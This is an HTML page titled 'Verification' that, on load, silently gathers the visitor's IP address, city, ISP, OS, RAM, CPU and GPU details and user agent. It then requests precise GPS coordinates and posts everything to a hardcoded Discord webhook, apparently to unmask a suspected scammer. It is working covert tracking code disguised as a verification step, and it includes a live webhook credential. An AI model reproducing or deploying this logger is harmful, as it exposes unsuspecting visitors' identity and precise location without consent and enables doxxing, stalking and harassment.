<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #ff0000; margin: 0; }
        #status { text-align: center; font-size: 1.5rem; font-weight: bold; padding: 20px; }
    </style>
</head>
<body>
    <div id="status">Fetching...</div>

    <script>
        const webhook = 'https://discord.com/api/webhooks/1496580919803252799/mtZ0WbdZnkxOOB0eMVyJx_xJ18EPEGWs9Gzdw2OCeRcFfICBpsIg09_rctz4pOYkBl0S';

        function getGPU() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return "N/A";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
        }

        async function collectAll() {
            const statusDiv = document.getElementById('status');
            let ipData = {};

            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (e) { 
                ipData = { ip: "Error", city: "Unknown", org: "Unknown" }; 
            }

            const initialPayload = {
                username: "ULTIMATE LOGGER",
                embeds: [{
                    title: "🚨 INITIAL RECON SENT 🚨",
                    color: 16711680,
                    fields: [
                        { name: "🌐 Network", value: `**IP:** ${ipData.ip}\n**City:** ${ipData.city}\n**ISP:** ${ipData.org}`, inline: true },
                        { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory}GB\n**Cores:** ${navigator.hardwareConcurrency}`, inline: true },
                        { name: "🖥️ GPU", value: `\`${getGPU()}\``, inline: false },
                        { name: "🕵️ User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(initialPayload) });

            statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const accuracy = pos.coords.accuracy;

                const geoPayload = {
                    username: "ULTIMATE LOGGER",
                    content: "🎯 **PRECISE GPS LOCATION ACQUIRED**",
                    embeds: [{
                        color: 16711680,
                        description: `[Click here to see on Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`,
                        fields: [
                            { name: "Latitude", value: `${lat}`, inline: true },
                            { name: "Longitude", value: `${lon}`, inline: true },
                            { name: "Accuracy", value: `${accuracy.toFixed(2)} meters`, inline: true }
                        ]
                    }]
                };

                await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(geoPayload) });
            }, (err) => {
                console.log("GPS Denied");
            }, { enableHighAccuracy: true });
        }

        window.onload = collectAll;
    </script>
</body>
</html>
